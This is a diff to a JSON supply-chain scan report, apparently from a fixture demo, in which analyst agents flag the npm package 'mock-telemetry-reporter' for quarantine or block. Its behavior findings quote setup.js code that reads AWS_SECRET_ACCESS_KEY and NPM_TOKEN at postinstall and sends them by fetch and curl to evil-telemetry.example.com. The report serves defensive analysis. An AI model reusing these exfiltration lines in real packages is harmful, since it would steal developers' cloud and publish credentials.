@@ -2,7 +2,7 @@
   "schemaVersion": "1.0",
   "subjectDigest": "8c25337c586380ee70dd7aa67bb9c9ead5790defaf62183485523ac9ca6dfd27",
   "evidencePath": "reports/demo/suspicious-fixture/evidence.json",
-  "generatedAt": "2025-07-14T00:00:00.000Z",
+  "generatedAt": "2025-07-14T12:00:00.000Z",
   "investigations": [
     {
       "schemaVersion": "1.0",
@@ -12,48 +12,41 @@
       "recommendation": "QUARANTINE",
       "findings": [
         {
-          "id": "tsd-001",
-          "evidenceIds": [
-            "evidence.packages[node_modules/mock-telemetry-reporter]"
-          ],
-          "severity": "low",
-          "confidence": "high",
-          "observation": "No name similarity to popular packages detected. 'mock-telemetry-reporter' does not match any widely-used npm package at edit distance ≤ 2 and is not a prefix/suffix permutation of a known popular package.",
-          "interpretation": "The package name does not exhibit classic typosquatting signals against canonical popular packages such as lodash, express, react, axios, chalk, picocolors, ms, semver, commander, or dotenv. No NAME_NEAR_MATCH observation was raised by the scanner.",
-          "benignExplanation": "The name may be a purpose-built internal or test utility with no intent to impersonate another package.",
-          "suggestedAction": "No blocking action required on name-similarity grounds alone; escalate to behavior-analyst and provenance-auditor for full risk assessment."
-        },
-        {
-          "id": "tsd-002",
-          "evidenceIds": [
-            "evidence.packages[node_modules/mock-telemetry-reporter]"
-          ],
-          "severity": "medium",
-          "confidence": "high",
-          "observation": "'mock-telemetry-reporter' is a direct production dependency (isDev: false, isDirect: true), yet the prefix 'mock-' is conventionally reserved for test/dev tooling. A production package using a 'mock-*' naming pattern is anomalous and may be an attempt to appear innocuous or to masquerade as a harmless test helper.",
-          "interpretation": "Naming a package with 'mock-' while placing it as a non-dev direct dependency is a name-based deception signal. Legitimate mock libraries are almost universally devDependencies. This discrepancy warrants human review before the package is permitted in production.",
-          "benignExplanation": "Some organizations publish 'mock-*' packages that are genuinely used at runtime for demo, simulation, or canary-testing purposes. The naming choice may be coincidental or reflect an unconventional but legitimate use case.",
-          "suggestedAction": "Quarantine pending human review. Verify with the committer whether this package is intentionally a production dependency and confirm the publisher identity matches the expected organization."
-        },
-        {
-          "id": "tsd-003",
-          "evidenceIds": [
-            "evidence.packages[node_modules/mock-telemetry-reporter]"
-          ],
+          "id": "td-001",
+          "evidenceIds": ["evidence.packages[node_modules/mock-telemetry-reporter]"],
           "severity": "medium",
           "confidence": "medium",
-          "observation": "Package provenance field 'isSynthetic' is true, indicating the package metadata does not correspond to a verifiable real registry entry. The package has a single maintainer and no attestation.",
-          "interpretation": "A synthetic provenance marker combined with a single-maintainer profile and no provenance attestation increases the plausibility of a name-squatting or phantom-package attack, even if the specific name does not closely resemble a popular target. This is a supporting name-deception signal.",
-          "benignExplanation": "In this context the evidence bundle is explicitly mode: 'fixture', so isSynthetic may simply reflect the test/demo nature of the bundle rather than a real threat.",
-          "suggestedAction": "Verify registry existence and maintainer identity out-of-band. Do not allow into production until provenance is confirmed as non-synthetic by the provenance-auditor."
+          "observation": "Package name 'mock-telemetry-reporter' does not closely resemble any single well-known popular npm package (lodash, express, react, axios, chalk, picocolors, ms, semver, commander, dotenv). No NAME_NEAR_MATCH observation is present in evidence. However, the name pattern — prefixing 'mock-' to a generic telemetry noun — is a common camouflage technique used by malicious packages to appear legitimate or test-related.",
+          "interpretation": "The name 'mock-telemetry-reporter' is not a direct typosquat of a specific popular package at edit distance ≤ 2. However, the 'mock-' prefix combined with a vague functional suffix ('telemetry-reporter') matches a known naming strategy for deceptive packages that masquerade as developer tooling or stubs. The package is a newly added direct production dependency (isDev: false, isDirect: true) with a single maintainer, a synthetic provenance flag, and no prior version — all of which amplify name-based risk. The combination of a camouflage-style name and corroborated malicious behavior (credential exfiltration and shell execution in postinstall) warrants human review before any deploy decision.",
+          "benignExplanation": "A legitimate internal or open-source mock/stub reporter for telemetry pipelines could reasonably carry this name with no deceptive intent.",
+          "suggestedAction": "Quarantine for human review. Verify the package origin, intended use, and publisher identity before allowing. Cross-check against any internal package allow-list. Do not install in CI or production until cleared."
+        },
+        {
+          "id": "td-002",
+          "evidenceIds": ["evidence.packages[node_modules/mock-telemetry-reporter]"],
+          "severity": "low",
+          "confidence": "high",
+          "observation": "No direct typographic near-match (edit distance ≤ 2 or prefix/suffix permutation) found between 'mock-telemetry-reporter' and any of the monitored popular packages: lodash, express, react, axios, chalk, picocolors, ms, semver, commander, dotenv.",
+          "interpretation": "Classic typosquatting (e.g. 'lodahs', 'expres') is not observed here. The name threat is pattern-based camouflage rather than character-level substitution. This finding records the absence of a direct typographic signal so the record is complete.",
+          "benignExplanation": "The name is genuinely distinct from monitored popular packages; no typosquat by character similarity.",
+          "suggestedAction": "No action required for edit-distance typosquatting specifically. Rely on td-001 for the broader name-deception assessment."
+        },
+        {
+          "id": "td-003",
+          "evidenceIds": ["evidence.packages[node_modules/picocolors]"],
+          "severity": "low",
+          "confidence": "high",
+          "observation": "Package 'picocolors' is unchanged (changeType: unchanged) and is the legitimate well-known package. No name similarity to any other popular package at edit distance ≤ 2 detected. Not evaluated for typosquatting.",
+          "interpretation": "This package is excluded from typosquat evaluation because its changeType is 'unchanged'. Recorded for completeness.",
+          "benignExplanation": "picocolors is a widely used, well-established npm package with a stable integrity hash across versions.",
+          "suggestedAction": "No action required for this package under typosquat-detective scope."
         }
       ],
       "unknowns": [
-        "Whether 'mock-telemetry-reporter' is published on the public npm registry under that exact name or is an internal/private package could not be verified without a live registry lookup.",
-        "Whether any legitimate, well-known package was recently renamed to or from 'mock-telemetry-reporter' is unknown.",
-        "The true publisher identity and organizational affiliation behind the single maintainer account cannot be confirmed from static metadata alone.",
-        "Runtime dynamic effects were not executed or observed (inherited from evidence bundle unknowns).",
-        "Full cryptographic npm provenance was not verified (adapter extension pending, inherited from evidence bundle unknowns)."
+        "Whether 'mock-telemetry-reporter' is an internal/private package that was intentionally named this way by the consuming team.",
+        "Whether a NAME_NEAR_MATCH scanner rule was run against the full npm registry (beyond the monitored popular package list) — no such observation appears in evidence.",
+        "Real-time npm registry data for 'mock-telemetry-reporter' was not available; publisher reputation and download history could not be verified.",
+        "Edit distance was computed against the monitored popular package list only; a broader registry similarity scan was not performed."
       ]
     },
     {
@@ -64,62 +57,59 @@
       "recommendation": "QUARANTINE",
       "findings": [
         {
-          "id": "PA-001",
+          "id": "PA-001-SYNTHETIC-PROVENANCE",
+          "evidenceIds": [
+            "evidence.packages[node_modules/mock-telemetry-reporter]",
+            "evidence.sources[0]",
+            "evidence.sources[1]"
+          ],
+          "severity": "high",
+          "confidence": "high",
+          "observation": "Package mock-telemetry-reporter@1.0.0 has isSynthetic:true in its provenance object. The only source entry for this package is sourceType:\"fixture\" (evidence.sources[0]), meaning this package was never downloaded from a real registry. The second source entry (evidence.sources[1]) has sourceType:\"synthetic\" and its URL points to the npm registry metadata endpoint — this is not a live registry query result. No live artifact download was performed.",
+          "interpretation": "All provenance data for this package originates from synthetic test fixtures, not from a real npm registry interaction. The integrity hash in the lockfile (sha512-mockSuspiciousIntegrityString...) cannot be verified against any real artifact. The contentDigest in sources[0] begins with 'sha256-fixture-files:' which is explicitly NOT a verified download integrity hash — it is a hash of the inspected fixture file content. The sources[1] contentDigest begins with 'sha256-metadata:' which hashes a registry metadata response, not a tarball, and is also marked synthetic. No verified integrity chain from a real download exists. Manual confirmation of this package's legitimacy is required before use in a production environment.",
+          "benignExplanation": "In a CI/test context, synthetic fixture data is intentional and does not represent a real supply chain risk. However, this evidence bundle should not be used to make an ALLOW decision for a production lockfile.",
+          "suggestedAction": "Do not allow this package into production based on synthetic evidence. Re-run the scanner against the real installed artifact from a live npm registry fetch and verify the integrity hash matches the lockfile value before permitting use."
+        },
+        {
+          "id": "PA-002-INTEGRITY-UNVERIFIABLE",
           "evidenceIds": [
             "evidence.packages[node_modules/mock-telemetry-reporter]",
             "evidence.sources[0]"
           ],
           "severity": "high",
           "confidence": "high",
-          "observation": "Package mock-telemetry-reporter@1.0.0 was resolved from registry.npmjs.org, but its sole download source is sourceType 'fixture' (evidence.sources[0]). The contentDigest 'sha256-fixture-files:f912cf345d3a38e2a1d987044c2b95a96e799d1c241ca9f1a7c1365df4cfcb80' is a hash of inspected fixture file content, NOT a verified download integrity hash of the actual published tarball. No live artifact was retrieved and hashed.",
-          "interpretation": "There is no verified cryptographic link between the lockfile integrity field and an actual downloaded tarball from the registry. The lockfile integrity value 'sha512-mockSuspiciousIntegrityString1234567890abcdefghijklmnopqrstuvwxyz==' is clearly a placeholder/mock value rather than a legitimate sha512 hash, further undermining confidence. Integrity consistency cannot be confirmed.",
-          "benignExplanation": "In a purely synthetic fixture environment, fixture-mode digests are expected and do not reflect a real attack. However, in a real deployment context this pattern would indicate unverified provenance.",
-          "suggestedAction": "Do not install this package until a live source retrieval confirms the tarball hash matches the lockfile integrity value. Replace the mock integrity string with a real sha512 hash from the registry."
+          "observation": "The lockfile integrity field for mock-telemetry-reporter@1.0.0 is 'sha512-mockSuspiciousIntegrityString1234567890abcdefghijklmnopqrstuvwxyz==' — this is a placeholder value, not a real sha512 hash of a real tarball. The only contentDigest available is 'sha256-fixture-files:f912cf345d3a38e2a1d987044c2b95a96e799d1c241ca9f1a7c1365df4cfcb80' (sources[0]), which is explicitly not a verified download integrity hash per the evidence schema rules.",
+          "interpretation": "There is no verified integrity hash for this package. The lockfile integrity value is clearly a synthetic placeholder. A real artifact integrity comparison (lockfile sha512 vs downloaded tarball sha512) could not be performed and is unknown. This does not constitute a confirmed ARTIFACT_INTEGRITY_MISMATCH on a live artifact (which would require BLOCK), but the inability to verify integrity on a package with active install scripts and suspicious behavioral signals is a high-severity provenance gap warranting QUARANTINE.",
+          "benignExplanation": "Expected in a fixture/demo bundle — no real package was downloaded so no real hash is available.",
+          "suggestedAction": "Obtain the real tarball from registry.npmjs.org, compute its sha512, and compare against the lockfile integrity field before permitting installation. If the mock-like integrity string appears in a real production lockfile, treat it as evidence of lockfile tampering."
         },
         {
-          "id": "PA-002",
-          "evidenceIds": [
-            "evidence.packages[node_modules/mock-telemetry-reporter]",
-            "evidence.sources[1]"
-          ],
+          "id": "PA-003-RECENT-PUBLISH",
+          "evidenceIds": ["evidence.packages[node_modules/mock-telemetry-reporter]"],
           "severity": "medium",
-          "confidence": "high",
-          "observation": "The registry metadata source for mock-telemetry-reporter is sourceType 'synthetic' (evidence.sources[1]). The contentDigest 'sha256-metadata:de5f29eb51f5a55d903707d17cdd4a31d0db48e0f8dd5e4c5ce4ca5c6b586682' hashes synthetic registry response content, not the actual tarball. No live registry query was performed.",
-          "interpretation": "Metadata provenance signals (maintainer count, publish date, repository URL) are all from a synthetic fixture. Confidence in these signals is low. The metadata cannot be trusted as a reflection of the real npm registry state for this package name.",
-          "benignExplanation": "This is expected behavior in a fixture/demo run. In production, real registry queries must be used.",
-          "suggestedAction": "Verify this package exists on the real npm registry before use. Confirm the package is published by the expected maintainer using a live registry query."
-        },
-        {
-          "id": "PA-003",
-          "evidenceIds": [
-            "evidence.packages[node_modules/mock-telemetry-reporter]"
-          ],
-          "severity": "high",
           "confidence": "medium",
-          "observation": "Provenance metadata for mock-telemetry-reporter is marked isSynthetic: true. The publishedAt timestamp is '2026-09-01T00:00:00.000Z' (a future date relative to most real-world baselines), maintainersCount is 1, repositoryUrl is 'https://github.com/example/mock-repo' (a placeholder URL), and hasAttestation is false. No npm provenance attestation is present.",
-          "interpretation": "All provenance data originates from a fixture; none of it reflects a real npm registry query. The repository URL is a generic example placeholder, not a verifiable source repository. The single-maintainer count combined with no attestation reduces confidence. The future publish date is anomalous and would be a high-risk signal in a real scenario.",
-          "benignExplanation": "In a fixture run, all provenance data is synthetic by design. A future publish date and placeholder repo URL are expected artifacts of the demo fixture.",
-          "suggestedAction": "Perform a live registry lookup to obtain real provenance metadata. Verify the repository URL resolves to a legitimate, actively maintained project. Confirm no recent ownership transfer has occurred."
+          "observation": "The provenance.publishedAt for mock-telemetry-reporter@1.0.0 is 2026-09-01T00:00:00.000Z and the evidence bundle was collected on 2026-09-27. The package was published approximately 26 days before the scan, which is a recent-to-moderate window. For a package with a single maintainer (maintainersCount:1) and suspicious behavioral characteristics, recent publication is an elevated risk signal.",
+          "interpretation": "Single-maintainer packages published recently with no prior history and active install scripts match a common malicious package pattern. The recency combined with maintainersCount of 1 and no attestation (hasAttestation:false) reduces trust in this package's provenance. Note: because isSynthetic:true, the publishedAt date itself is fixture data and may not represent a real registry value.",
+          "benignExplanation": "New legitimate packages are published daily and a single-maintainer recently published package is not inherently malicious. The provenance date being synthetic means this risk signal carries lower evidentiary weight.",
+          "suggestedAction": "Verify the real publication date and maintainer history via the npm registry before allowing this package. Check if this package existed prior to the lockfile change or if it was brand-new at the time of the dependency addition."
         },
         {
-          "id": "PA-004",
-          "evidenceIds": [
-            "evidence.packages[node_modules/mock-telemetry-reporter]"
-          ],
+          "id": "PA-004-NO-ATTESTATION",
+          "evidenceIds": ["evidence.packages[node_modules/mock-telemetry-reporter]"],
           "severity": "medium",
-          "confidence": "high",
-          "observation": "The lockfile integrity value for mock-telemetry-reporter is 'sha512-mockSuspiciousIntegrityString1234567890abcdefghijklmnopqrstuvwxyz==', which is not a valid sha512 base64-encoded hash. A legitimate npm sha512 integrity value is 88 characters of base64 (including padding). This value is a recognizable placeholder.",
-          "interpretation": "A non-genuine integrity hash in the lockfile means the package manager cannot enforce artifact integrity verification. Even if the package were installed, the hash would not protect against a tampered tarball. This is a direct failure of supply-chain integrity controls.",
-          "benignExplanation": "In a synthetic fixture environment this is intentional. In any real project this would be a critical misconfiguration or deliberate tampering.",
-          "suggestedAction": "Replace the integrity field with the real sha512 hash from the npm registry manifest for mock-telemetry-reporter@1.0.0 before allowing installation."
+          "confidence": "medium",
+          "observation": "provenance.hasAttestation is false for mock-telemetry-reporter@1.0.0. No npm provenance attestation (Sigstore SLSA) is present for this package.",
+          "interpretation": "The absence of a cryptographic provenance attestation means there is no verifiable link between the published npm artifact and a specific source repository commit or CI build pipeline. For a new package with suspicious behavioral signals (install script exfiltrating env vars), the lack of attestation removes an important trust signal. Note that hasAttestation:true would only record presence, not constitute verified provenance — full attestation verification was not performed.",
+          "benignExplanation": "The vast majority of npm packages do not have Sigstore attestations. Absence alone is not a malice indicator.",
+          "suggestedAction": "Prefer packages with npm provenance attestations for sensitive production dependencies. If adopting this package, request that the maintainer publish with provenance enabled."
         }
       ],
       "unknowns": [
-        "NPM provenance attestation verification (Sigstore/SLSA) was not performed — no live attestation API query was possible from static evidence alone.",
-        "Actual maintainer identity and ownership history could not be verified without a live npm registry query.",
-        "Whether the GitHub repository URL 'https://github.com/example/mock-repo' resolves to a real, maintained repository was not confirmed.",
-        "The lockfile integrity hash could not be compared to a live tarball hash because no live artifact was retrieved (sourceType is 'fixture', not 'live').",
-        "Previous maintainer count is unknown (previousVersion is null); maintainer change history cannot be assessed."
+        "Full cryptographic npm provenance attestation verification via the Sigstore/npm provenance API was not performed — hasAttestation records presence only, not a verified attestation chain. (Inherited from evidence.unknowns: adapter extension pending.)",
+        "Runtime dynamic effects were not executed or observed. The behavioral signals in observations[] were detected via static analysis only.",
+        "The real published date, maintainer history, and download count for mock-telemetry-reporter could not be verified — provenance.isSynthetic:true means all provenance metadata is fixture data, not a live registry query result.",
+        "Whether the lockfile integrity value 'sha512-mockSuspiciousIntegrityString...' was present before the change (i.e. lockfile tampering) could not be determined — previousIntegrity is null.",
+        "The identity and trustworthiness of the single maintainer (maintainersCount:1) could not be verified — no maintainer identity data is present in the evidence bundle."
       ]
     },
     {
@@ -132,56 +122,6 @@
         {
           "id": "ba-finding-001",
           "evidenceIds": [
-            "obs-mock-telemetry-reporter-script-1"
-          ],
-          "severity": "high",
-          "confidence": "high",
-          "observation": "Package mock-telemetry-reporter@1.0.0 defines a postinstall lifecycle script: \"node setup.js\". This script executes automatically upon package installation without user intervention.",
-          "interpretation": "The presence of a postinstall script in a newly added, single-maintainer package with no attestation is a behavioral trigger. The script invokes setup.js, which scanner observations confirm performs credential harvesting and network exfiltration. This lifecycle hook ensures malicious code runs unconditionally on install.",
-          "benignExplanation": null,
-          "suggestedAction": "Block installation. Postinstall scripts that trigger network and credential-harvesting behavior must not be permitted in a production dependency."
-        },
-        {
-          "id": "ba-finding-002",
-          "evidenceIds": [
-            "obs-mock-telemetry-reporter-environment_access-2"
-          ],
-          "severity": "high",
-          "confidence": "high",
-          "observation": "setup.js line 3 reads environment variables AWS_SECRET_ACCESS_KEY and NPM_TOKEN: \"const token = process.env.AWS_SECRET_ACCESS_KEY || process.env.NPM_TOKEN;\"",
-          "interpretation": "The script specifically targets well-known secrets-bearing environment variables (AWS credentials and npm publish tokens). This is a credential-harvesting pattern characteristic of supply chain malware designed to exfiltrate CI/CD secrets and cloud access keys.",
-          "benignExplanation": null,
-          "suggestedAction": "Block installation. Targeted credential harvesting of AWS_SECRET_ACCESS_KEY and NPM_TOKEN has no legitimate use in a telemetry reporter package."
-        },
-        {
-          "id": "ba-finding-003",
-          "evidenceIds": [
-            "obs-mock-telemetry-reporter-network_operation-3"
-          ],
-          "severity": "critical",
-          "confidence": "high",
-          "observation": "setup.js line 4 performs an HTTP fetch to an external attacker-controlled domain encoding the harvested token: \"fetch(\\\"https://evil-telemetry.example.com/exfil?token=\\\" + encodeURIComponent(token || 'none'));\"",
-          "interpretation": "The network call transmits the harvested credential value to a URL whose domain name (evil-telemetry.example.com) is explicitly adversarial. This confirms the environment access observation is part of a credential exfiltration chain. The token is appended as a query parameter, a classic data-exfiltration pattern.",
-          "benignExplanation": null,
-          "suggestedAction": "Block immediately. This is unambiguous credential exfiltration to an external attacker-controlled endpoint."
-        },
-        {
-          "id": "ba-finding-004",
-          "evidenceIds": [
-            "obs-mock-telemetry-reporter-process_execution-5",
-            "obs-mock-telemetry-reporter-process_execution-6",
-            "obs-mock-telemetry-reporter-network_operation-4"
-          ],
-          "severity": "critical",
-          "confidence": "high",
-          "observation": "setup.js lines 5–6 import child_process and invoke execSync to run a curl beacon to the same attacker domain: \"execSync(\\\"curl -s https://evil-telemetry.example.com/beacon\\\");\"",
-          "interpretation": "Process execution via child_process.execSync is a high-risk behavioral indicator. Combined with the curl call to the same attacker-controlled domain as the fetch exfiltration, this constitutes a second, independent exfiltration/beaconing channel. The redundancy suggests intentional resilience: if the fetch API is unavailable, execSync/curl is the fallback. This is a textbook multi-vector exfiltration script.",
-          "benignExplanation": null,
-          "suggestedAction": "Block immediately. Dual-channel exfiltration using both fetch and execSync/curl to an attacker-controlled domain represents critical malicious behavior."
-        },
-        {
-          "id": "ba-finding-005",
-          "evidenceIds": [
             "obs-mock-telemetry-reporter-script-1",
             "obs-mock-telemetry-reporter-environment_access-2",
             "obs-mock-telemetry-reporter-network_operation-3",
@@ -191,19 +131,41 @@
           ],
           "severity": "critical",
           "confidence": "high",
-          "observation": "Combined signal: mock-telemetry-reporter@1.0.0 exhibits simultaneous presence of a lifecycle install script, environment variable credential harvesting (AWS_SECRET_ACCESS_KEY, NPM_TOKEN), two independent network exfiltration operations, and process execution via child_process — all triggered automatically on install.",
-          "interpretation": "The co-occurrence of install script + environment access + network operations + process execution across all six scanner observations for this package constitutes a definitive data-exfiltration pattern. All four signal categories required for critical severity upgrade are present. This package is a supply chain implant designed to steal CI/CD credentials and cloud access keys upon installation.",
+          "observation": "mock-telemetry-reporter@1.0.0 (newly added) exhibits a full data-exfiltration pattern: a postinstall lifecycle script (node setup.js) reads sensitive environment variables (AWS_SECRET_ACCESS_KEY, NPM_TOKEN), then transmits them via fetch() to https://evil-telemetry.example.com/exfil, and also invokes execSync('curl ... https://evil-telemetry.example.com/beacon') via child_process — combining lifecycle script, environment access, network operations, and process execution in a single install-time payload.",
+          "interpretation": "Three or more co-occurring behavioral signals (LIFECYCLE_SCRIPT_ADDED + ENVIRONMENT_ACCESS + NETWORK_OPERATION × 2 + PROCESS_EXECUTION × 2) satisfy the combined-signal rule for a data-exfiltration pattern. The postinstall script harvests AWS and NPM credentials and exfiltrates them to an external attacker-controlled domain at install time. The package is a direct, non-dev production dependency, maximising exposure. This pattern is characteristic of a supply-chain credential-theft attack and warrants a BLOCK recommendation.",
           "benignExplanation": null,
-          "suggestedAction": "BLOCK. Do not install. Remove from package.json and lockfile immediately. Rotate any secrets that may have been exposed in environments where this package was previously installed. Investigate whether any CI/CD pipeline has already executed this postinstall script."
+          "suggestedAction": "Block immediately. Do not install this package. Remove it from package.json and lock file. Rotate any AWS_SECRET_ACCESS_KEY and NPM_TOKEN values that may have been exposed on systems where this package was previously installed. Investigate whether the package was installed in any prior build or CI environment."
+        },
+        {
+          "id": "ba-finding-002",
+          "evidenceIds": [
+            "obs-mock-telemetry-reporter-process_execution-5",
+            "obs-mock-telemetry-reporter-process_execution-6"
+          ],
+          "severity": "high",
+          "confidence": "high",
+          "observation": "mock-telemetry-reporter@1.0.0 uses child_process.execSync() to run an arbitrary curl shell command during postinstall, constituting direct process execution from an install-time script.",
+          "interpretation": "PROCESS_EXECUTION via child_process.execSync is independently high-severity even apart from the broader exfiltration pattern. It gives the package the ability to run arbitrary system commands on the installing machine at install time, with no user interaction.",
+          "benignExplanation": null,
+          "suggestedAction": "Block. Process execution in install scripts from a newly added, single-maintainer package with no attestation is not acceptable in a production supply chain without explicit pre-approval and source audit."
+        },
+        {
+          "id": "ba-finding-003",
+          "evidenceIds": ["obs-mock-telemetry-reporter-environment_access-2"],
+          "severity": "high",
+          "confidence": "high",
+          "observation": "mock-telemetry-reporter@1.0.0 reads process.env.AWS_SECRET_ACCESS_KEY and process.env.NPM_TOKEN in setup.js at install time — targeting high-value credential environment variables by name.",
+          "interpretation": "Targeted access to named credential environment variables (AWS_SECRET_ACCESS_KEY, NPM_TOKEN) during install is a strong indicator of intentional credential harvesting rather than incidental environment inspection. These are the most sensitive variables present in typical CI/CD and developer environments.",
+          "benignExplanation": null,
+          "suggestedAction": "Block. Credential harvesting by name during install is not a legitimate pattern for any dependency. Treat any environment that ran this install as potentially compromised and rotate credentials."
         }
       ],
       "unknowns": [
-        "Runtime dynamic effects of setup.js were not executed or observed; additional payloads or staged downloads triggered at runtime cannot be ruled out.",
-        "The full content of setup.js beyond the scanned lines is unknown; further malicious logic may exist beyond lines 3–6.",
-        "It is unknown whether evil-telemetry.example.com exfiltration endpoint has received any data in environments where this package may have been previously installed.",
-        "Full cryptographic npm provenance was not verified; the integrity value 'sha512-mockSuspiciousIntegrityString1234567890abcdefghijklmnopqrstuvwxyz==' does not match any known real package hash format and may be fabricated.",
-        "Dynamic imports or require() calls not visible in static analysis may load additional modules or obfuscated payloads at runtime.",
-        "The package has isSynthetic: true in provenance metadata; the actual published package on npm (if any) may differ from the fixture analyzed here."
+        "Runtime dynamic effects of setup.js beyond the statically observed lines were not executed or observed; additional payloads may exist beyond lines 3–6.",
+        "The full contents of setup.js were not directly read; analysis is based solely on observation excerpts recorded by the scanner. Further code in setup.js may contain additional malicious behavior not yet captured.",
+        "Full cryptographic npm provenance was not verified (adapter extension pending); the integrity string 'sha512-mockSuspiciousIntegrityString...' could not be validated against a known-good registry attestation.",
+        "Dynamic imports or runtime require() calls that do not appear in the scanned lines are unknown.",
+        "Whether this package was already installed in any prior CI run or developer environment — and thus whether credentials were already exfiltrated — is unknown and requires incident response review."
       ]
     }
   ],
